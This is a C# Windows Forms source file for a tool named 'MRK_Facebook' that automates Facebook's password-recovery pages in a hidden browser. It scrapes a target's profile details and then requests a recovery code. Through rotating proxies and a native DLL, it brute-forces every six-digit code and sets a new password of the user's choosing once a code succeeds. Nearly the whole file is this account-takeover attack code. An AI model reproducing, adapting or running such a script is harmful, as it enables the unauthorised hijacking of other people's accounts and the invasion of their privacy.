/*
 * Copyright (c) 2020, Mohamed Ammar <mamar452@gmail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

//#define MRK_DEBUG

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MetroFramework.Forms;
using MetroFramework.Controls;
using MetroFramework.Interfaces;
using System.Runtime.InteropServices;

namespace MRK_Facebook {
    public partial class Main : MetroForm {
        delegate void OnLocalLoad(object sender, WebBrowserDocumentCompletedEventArgs e);

        const string FACEBOOK = "www.facebook.com";
        const string PROFILE_FILE = "profile.php";
        const string PROFILE_ERROR = "err";
        const string CLASS_NAME = "_2nlw _2nlv";
        const string CODE_IF_PRESENT = "000000";

        WebBrowser m_Browser;
        OnLocalLoad m_LocalLoad;
        OnLocalLoad m_DirtyLoad;
        HtmlDocument m_LocalDoc;
        string m_LastNav;
        double m_Progress;
        Color[] m_Colors;
        Timer m_Interpolator;

        [DllImport("MRK-FB.dll")]
        static extern bool ExCode(string num, string md5);

        [DllImport("MRK-FB.dll")]
        static extern void SetProxies(string proxy);

        [DllImport("MRK-FB.dll")]
        static extern void Init(int[] m, float tEx);

        [DllImport("MRK-FB.dll")]
        static extern float LastExR();

        [DllImport("MRK-FB.dll")]
        static extern void Sanity();

        public Main() {
            InitializeComponent();
            bVal.Click += OnValidateClick;
            bFuck.Click += OnFuckClick;
            m_Browser = new WebBrowser {
                ScriptErrorsSuppressed = true,
                Visible = false
            };

#if MRK_DEBUG
            Debugger debugger = new Debugger();
            m_Browser = debugger.Browser;
            debugger.Show();
#endif

            m_Browser.DocumentCompleted += OnProxyLoad;

            lState.Text = "";

            m_Interpolator = new Timer {
                Interval = 16
            };

            m_Interpolator.Tick += (o, e) => {
                m_Progress = (m_Progress + 0.05432f * 2f) % m_Colors.Length;
                int ilow = (int)Math.Floor(m_Progress);
                int ihigh = (ilow + 1) % m_Colors.Length;

                lMRK.ForeColor = InterpolateColor(m_Colors[ilow], m_Colors[ihigh], m_Progress % 1f);

                foreach (Control ctrl in Controls) {
                    if (ctrl == tbDet)
                        continue;

                    if (ctrl is IMetroControl)
                        ((IMetroControl)ctrl).UseCustomForeColor = true;

                    ctrl.ForeColor = lMRK.ForeColor;
                }
            };

            m_Interpolator.Start();

            PropertyInfo[] props = typeof(Color).GetProperties(BindingFlags.Public | BindingFlags.Static);
            m_Colors = new Color[props.Length];
            for (int i = 0; i < props.Length; i++)
                m_Colors[i] = (Color)props[i].GetGetMethod().Invoke(null, new object[0]);

            try {
                Sanity();
            }
            catch {
                MessageBox.Show("Runtime failure");
                Close();
                return;
            }


            //i am using some local proxies of mine
            AddDetail("Using preset proxies...");
            SetProxies("myproxies_paid.txt");
            tbProxies.Text = "myproxies_paid.txt";
        }

        Color InterpolateColor(Color source, Color target, double percent) {
            byte r = (byte)(source.R + (target.R - source.R) * percent);
            byte g = (byte)(source.G + (target.G - source.G) * percent);
            byte b = (byte)(source.B + (target.B - source.B) * percent);

            return Color.FromArgb(255, r, g, b);
        }

        void OnProxyLoad(object sender, WebBrowserDocumentCompletedEventArgs e) {
            m_DirtyLoad?.Invoke(sender, e);

            if (m_LastNav != null && !e.Url.OriginalString.Contains(m_LastNav))
                return;

            m_LocalDoc = m_Browser.Document;
            m_LocalLoad?.Invoke(sender, e);
        }

        bool IsNumerical(string txt) {
            foreach (char c in txt)
                if (!char.IsDigit(c))
                    return false;

            return true;
        }

        void Navigate(string link) {
            m_LastNav = link;
            m_Browser.Navigate(link);
        }

        void AddDetail(string detail) {
            tbDet.AppendText(detail + '\n');
        }

        string GetRealProfile(string intxt) {
            if (intxt.Length == 0)
                return PROFILE_ERROR;

            if (IsNumerical(intxt)) //fb id
            {
                return FACEBOOK + $"/{PROFILE_FILE}?id={intxt}";
            }

            //check existance of fb
            int fbIdx = intxt.IndexOf(FACEBOOK);
            if (fbIdx != -1) {
                //fb link
                int idx = intxt.IndexOf(PROFILE_FILE);
                if (idx != -1) {
                    //dealing with fb link with id
                    int realIdx = fbIdx + idx + PROFILE_FILE.Length + 4;

                    string endlessStream = intxt.Substring(realIdx);
                    string buf = "";

                    int i = 0;
                    while (true) {
                        char c = endlessStream[i];
                        if (char.IsDigit(c))
                            buf += c;
                        else
                            break;

                        i++;

                        if (i == endlessStream.Length)
                            break;
                    }

                    //buf has my id
                    return FACEBOOK + $"/{PROFILE_FILE}?id={buf}";
                }

                //i got fb but no profile, term with /
                string _endlessStream = intxt.Substring(fbIdx + FACEBOOK.Length + 1);

                int _i = 0;
                string _buf = "";
                while (true) {
                    char c = _endlessStream[_i];
                    if (c == '/')
                        break;

                    _buf += c;
                    _i++;

                    if (_i == _endlessStream.Length)
                        break;
                }

                //buf has my user
                return FACEBOOK + $"/{_buf}";
            }

            return PROFILE_ERROR;
        }

        void SetState(string state) {
            lState.Text = state;
        }

        HtmlElement GetElementWithAttr(string attr, string val) {
            foreach (HtmlElement element in m_LocalDoc.All)
                if (element.GetAttribute(attr) == val)
                    return element;

            return null;
        }

        HtmlElement GetElementWithClass(string clazz) {
            return GetElementWithAttr("className", clazz);
        }

        void SetElementValue(HtmlElement buf, string value) {
            buf.SetAttribute("value", value);
        }

        void OnFuckClick(object sender, EventArgs e) {
            HtmlElement buf = GetElementWithClass("_42ft _4jy0 _4jy3 _4jy1 selected _51sy");
            if (buf == null) {
                Navigate("https://www.facebook.com/login/identify?ctx=recover");
                m_LocalLoad = (_o, _e) => {
                    buf = GetElementWithClass("inputtext");
                    if (buf == null) {
                        AddDetail("FAILT - 1");
                        return;
                    }

                    SetElementValue(buf, tbEmail.Text);
                    GetElementWithAttr("id", "u_0_2").InvokeMember("click");
                    //Navigate(m_Browser.Url.OriginalString);
                    m_DirtyLoad = (__o, __e) => {
                        buf = GetElementWithClass("_42ft _4jy0 _4jy3 _4jy1 selected _51sy");
                        if (buf == null) {
                            AddDetail("Fail - 3");
                            return;
                        }
                        buf.InvokeMember("click");

                        m_DirtyLoad = (___o, ___e) => {
                            buf = GetElementWithClass("_585r _50f4");
                            if (buf != null) {
                                buf = GetElementWithAttr("id", "recovery_code_entry");
                                if (buf == null) {
                                    AddDetail("Fail - 4");
                                    return;
                                }

                                SetState("WORKER PERMS");
                                AddDetail("Worker state...");
                                AddDetail("THREADS=" + tbThread.Text);
                                int threadCount = int.Parse(tbThread.Text);
                                int valuesPerPart = 1000000 / threadCount;
                                Dictionary<int, int> indx = new Dictionary<int, int>();
                                int[][] values = new int[threadCount][];
                                DateTime time = DateTime.Now;
                                float delta = 0f;
                                float timer = 0f;
                                float timePerEx = 2f;
                                int prob = 0;

                                Init(new int[] { threadCount, valuesPerPart }, timePerEx);

                                string _code = "000000";

                                while (true) {
                                    delta = (DateTime.Now - time).Ticks / TimeSpan.TicksPerSecond;
                                    delta /= 1000f;

                                    timer += delta;
                                    if (timer >= timePerEx)
                                        timer = 0f;
                                    else
                                        continue;

                                    timePerEx *= LastExR();// 0.9f;

                                    bool gbreak = false;

                                    for (int i = 0; i < threadCount; i++) {
                                        int[] _v = values[i];
                                        if (_v == null || _v.Length == 0) {
                                            _v = new int[valuesPerPart];
                                            for (int j = 0; j < valuesPerPart; j++) {
                                                _v[j] = i * valuesPerPart + j;
                                            }

                                            int root = _v[0];

                                            if (cbShuffle.Checked) {
                                                Random rand = new Random();
                                                _v = _v.OrderBy(x => rand.Next()).ToArray();
                                            }

                                            AddDetail($"Init ={_v[0]}, c={_v.Length}, r={root}");
                                            AddDetail("wait...");

                                            values[i] = _v;
                                            indx[i] = 0;

                                            timer = 0f;
                                            continue;
                                        }

                                        //try code x
                                        int code = _v[indx[i]];

                                        string md5 = "";

                                        using (MD5 _md5 = MD5.Create()) {
                                            byte[] inputBytes = Encoding.ASCII.GetBytes(code.ToString());
                                            byte[] hashBytes = _md5.ComputeHash(inputBytes);
                                            StringBuilder sb = new StringBuilder();
                                            for (int j = 0; j < hashBytes.Length; j++)
                                                sb.Append(hashBytes[j].ToString("X2"));

                                            md5 = sb.ToString();
                                            AddDetail(md5);
                                        }

                                        string realCode = code.ToString();
                                        if (realCode.Length < 6)
                                            realCode = realCode.Insert(0, new string('0', 6 - realCode.Length));

                                        bool res = ExCode(realCode, md5);

                                        AddDetail($"RES={res}");

                                        if (res) {
                                            _code = realCode;
                                            AddDetail("done");
                                            SetState("rekt");
                                            gbreak = true;
                                            break;
                                        }

                                        indx[i]++;
                                        prob++;

                                        lProb.Text = $"{prob / 1000000f * 100f}%";
                                        SetState(prob.ToString());
                                        AddDetail($"{prob / 1000000f * 100f}%");
                                    }

                                    if (gbreak)
                                        break;

                                    //get last of last
                                    if (indx[threadCount - 1] >= valuesPerPart - 1)
                                        break;
                                }

                                if (_code == "000000") {
                                    AddDetail("Fail..");
                                    return;
                                }

                                SetElementValue(buf, _code);

                                buf = GetElementWithClass("_42ft _4jy0 _4jy3 _4jy1 selected _51sy");
                                if (buf == null) {
                                    AddDetail("Fail - 5");
                                    return;
                                }

                                buf.InvokeMember("click");

                                buf = GetElementWithClass("inputtext _55r1 _41sy");
                                if (buf == null) {
                                    AddDetail("Fail - 5.1");
                                    return;
                                }

                                SetElementValue(buf, tbNew.Text);

                                buf = GetElementWithClass("_42ft _42fu selected _42g-");
                                if (buf == null) {
                                    AddDetail("Fail - 7");
                                    return;
                                }

                                buf.InvokeMember("click");
                            }

                            else {


                                m_DirtyLoad = (______o, ______e) => {
                                    buf = GetElementWithClass("inputtext _55r1 _41sy");
                                    if (buf == null) {
                                        AddDetail("Fail - 6");
                                        return;
                                    }

                                    SetElementValue(buf, tbNew.Text);

                                    buf = GetElementWithClass("_42ft _42fu selected _42g-");
                                    if (buf == null) {
                                        AddDetail("Fail - 7");
                                        return;
                                    }

                                    buf.InvokeMember("click");
                                };
                            }
                        };
                    };
                };
            }
            else {
                buf.InvokeMember("click");
                m_DirtyLoad = (___o, ___e) => {
                    buf = GetElementWithClass("_585r _50f4");
                    if (buf != null) {
                        buf = GetElementWithAttr("id", "recovery_code_entry");
                        if (buf == null) {
                            AddDetail("Fail - 4");
                            return;
                        }

                        SetState("WORKER PERMS");
                        AddDetail("Worker state...");
                        AddDetail("THREADS=" + tbThread.Text);
                        int threadCount = int.Parse(tbThread.Text);
                        int valuesPerPart = 1000000 / threadCount;
                        Dictionary<int, int> indx = new Dictionary<int, int>();
                        int[][] values = new int[threadCount][];
                        DateTime time = DateTime.Now;
                        float delta = 0f;
                        float timer = 0f;
                        float timePerEx = 2f;
                        int prob = 0;

                        Init(new int[] { threadCount, valuesPerPart }, timePerEx);

                        string _code = "000000";

                        while (true) {
                            delta = (DateTime.Now - time).Ticks / TimeSpan.TicksPerSecond;
                            delta /= 1000f;

                            timer += delta;
                            if (timer >= timePerEx)
                                timer = 0f;
                            else
                                continue;

                            timePerEx *= LastExR();

                            bool gbreak = false;

                            for (int i = 0; i < threadCount; i++) {
                                int[] _v = values[i];
                                if (_v == null || _v.Length == 0) {
                                    _v = new int[valuesPerPart];
                                    for (int j = 0; j < valuesPerPart; j++) {
                                        _v[j] = i * valuesPerPart + j;
                                    }

                                    int root = _v[0];

                                    if (cbShuffle.Checked) {
                                        Random rand = new Random();
                                        _v = _v.OrderBy(x => rand.Next()).ToArray();
                                    }

                                    AddDetail($"Init ={_v[0]}, c={_v.Length}, r={root}");
                                    AddDetail("wait...");

                                    values[i] = _v;
                                    indx[i] = 0;

                                    timer = 0f;
                                    continue;
                                }

                                //try code x
                                int code = _v[indx[i]];

                                string md5 = "";

                                using (MD5 _md5 = MD5.Create()) {
                                    byte[] inputBytes = Encoding.ASCII.GetBytes(code.ToString());
                                    byte[] hashBytes = _md5.ComputeHash(inputBytes);
                                    StringBuilder sb = new StringBuilder();
                                    for (int j = 0; j < hashBytes.Length; j++)
                                        sb.Append(hashBytes[j].ToString("X2"));

                                    md5 = sb.ToString();

                                    AddDetail(md5);
                                }

                                string realCode = code.ToString();
                                if (realCode.Length < 6)
                                    realCode = realCode.Insert(0, new string('0', 6 - realCode.Length));

                                bool res = ExCode(realCode, md5);

                                AddDetail($"RES={res}");

                                if (res) {
                                    _code = realCode;
                                    AddDetail("done");
                                    SetState("rekt");
                                    gbreak = true;
                                    break;
                                }

                                indx[i]++;
                                prob++;

                                lProb.Text = $"{prob / 1000000f * 100f}%";
                                SetState(prob.ToString());
                                AddDetail($"{prob / 1000000f * 100f}%");
                            }

                            if (gbreak)
                                break;

                            //get last of last
                            if (indx[threadCount - 1] >= valuesPerPart - 1)
                                break;
                        }

                        if (_code == "000000") {
                            AddDetail("Fail..");
                            return;
                        }

                        SetElementValue(buf, _code);

                        buf = GetElementWithClass("_42ft _4jy0 _4jy3 _4jy1 selected _51sy");
                        if (buf == null) {
                            AddDetail("Fail - 5");
                            return;
                        }

                        buf.InvokeMember("click");
                    }

                    else {


                        //m_DirtyLoad = (______o, ______e) =>
                        //{
                        buf = GetElementWithClass("inputtext _55r1 _41sy");
                        if (buf == null) {
                            AddDetail("Fail - 6");
                            return;
                        }

                        SetElementValue(buf, tbNew.Text);

                        buf = GetElementWithClass("_42ft _42fu selected _42g-");
                        if (buf == null) {
                            AddDetail("Fail - 7");
                            return;
                        }

                        buf.InvokeMember("click");
                        //};
                    }
                };
            }
        }

        void ResetPassword() {
            HtmlElement buf = null;

            m_LocalLoad = (___o, ___e) => {
                bool done = false;
                buf = GetElementWithClass("_42ft _4jy0 _4jy3 _4jy1 selected _51sy");
                if (buf != null) {
                    buf.InvokeMember("click");
                    AddDetail("Fail - 3");
                }

                else {

                    AddDetail(m_LocalDoc.Url.OriginalString);

                    if (m_LocalDoc.Url.OriginalString == "https://www.facebook.com/recover/initiate/?ars=facebook_login") {
                        //failed
                        m_LocalDoc = m_Browser.Document;
                        buf = GetElementWithAttr("href", "/login/identify?ctx=recover");
                        if (buf == null) {
                            AddDetail("FAILT");

                            return;
                        }

                        buf.InvokeMember("click");
                        //m_LocalLoad = (xo, xe) =>
                        //{
                        m_LocalDoc = m_Browser.Document;
                        buf = GetElementWithClass("inputtext");
                        if (buf == null) {
                            AddDetail("FAILT - 1");
                            return;
                        }

                        SetElementValue(buf, tbEmail.Text);
                        GetElementWithAttr("id", "u_0_2").InvokeMember("click");

                        done = true;
                        ResetPassword();
                        return;
                        //};
                    }
                }

                if (!done)
                    return;

                m_LocalLoad = (_____o, _____e) => {
                    buf = GetElementWithClass("_585r _50f4");
                    if (buf != null) {
                        buf = GetElementWithAttr("id", "recovery_code_entry");
                        if (buf == null) {
                            AddDetail("Fail - 4");
                            return;
                        }

                        SetElementValue(buf, CODE_IF_PRESENT);

                        buf = GetElementWithClass("_42ft _4jy0 _4jy3 _4jy1 selected _51sy");
                        if (buf == null) {
                            AddDetail("Fail - 5");
                            return;
                        }

                        buf.InvokeMember("click");
                    }

                    else {


                        m_LocalLoad = (______o, ______e) => {
                            buf = GetElementWithClass("inputtext _55r1 _41sy");
                            if (buf == null) {
                                AddDetail("Fail - 6");
                                return;
                            }

                            SetElementValue(buf, tbNew.Text);

                            buf = GetElementWithClass("_42ft _42fu selected _42g-");
                            if (buf == null) {
                                AddDetail("Fail - 7");
                                return;
                            }

                            buf.InvokeMember("click");
                        };
                    }
                };
            };
        }

        void OnValidateClick(object sender, EventArgs e) {
            AddDetail("Attempting to fetch...");
            AddDetail("Getting real profile");
            string realfblink = GetRealProfile(tbProfile.Text);

            if (realfblink == PROFILE_ERROR) {
                SetState("Cannot get real profile");
                AddDetail("Cannot get real profile");
                return;
            }

            SetState("Got real profile");
            AddDetail($"Got real profile...\n{realfblink}");

            m_Browser.Navigate(realfblink);
            m_LocalLoad = (o, evt) => {
                HtmlElement buf = GetElementWithAttr("id", "fb-timeline-cover-name");//GetElementWithClass(CLASS_NAME);
                if (buf != null)
                    tbName.Text = buf.InnerText;

                AddDetail("Checked name");

                buf = GetElementWithClass("alternate_name");
                if (buf != null)
                    tbNx.Text = buf.InnerText;
                else
                    tbNx.Text = "-";

                AddDetail("Checked nx");

                buf = GetElementWithClass("_11kf img");
                if (buf != null)
                    pbPf.Load(buf.GetAttribute("src"));

                AddDetail("Checked pfp");

                buf = GetElementWithAttr("id", "pagelet_timeline_main_column");
                if (buf != null) {
                    string dgt = buf.GetAttribute("data-gt");
                    int idx = dgt.IndexOf("{\"profile_owner\":\"");
                    string real = dgt.Substring(idx + 18);
                    string id = "";

                    foreach (char c in real)
                        if (!char.IsDigit(c))
                            break;
                        else
                            id += c;

                    tbId.Text = id;
                }

                AddDetail("Checked id");

                Navigate("www.facebook.com/login/device-based/regular/login/");
                m_LocalLoad = (_o, _e) => {
                    buf = GetElementWithClass("inputtext _55r1 inputtext _1kbt inputtext _1kbt");
                    if (buf == null) {
                        AddDetail("Fail - 0");
                        return;
                    }

                    SetElementValue(buf, tbId.Text);

                    buf = GetElementWithAttr("id", "pass");
                    if (buf == null) {
                        AddDetail("Fail 0.1");
                        return;
                    }

                    SetElementValue(buf, "iammrkdagods");

                    buf = GetElementWithClass("inputtext _55r1 inputtext _1kbt _4rer inputtext _1kbt");
                    if (buf != null)
                        SetElementValue(buf, tbId.Text);

                    buf = GetElementWithAttr("id", "loginbutton");
                    if (buf == null) {
                        AddDetail("Fail - 1");
                        return;
                    }

                    buf.InvokeMember("click");

                    m_LocalLoad = (__o, __e) => {
                        buf = GetElementWithAttr("href", "https://www.facebook.com/recover/initiate/?ars=facebook_login");
                        if (buf == null) {
                            AddDetail("Fail - 2");
                            return;
                        }

                        buf.InvokeMember("click");

                        ResetPassword();
                        m_LocalLoad(this, new WebBrowserDocumentCompletedEventArgs(null));
                    };
                };
            };
        }
    }
}
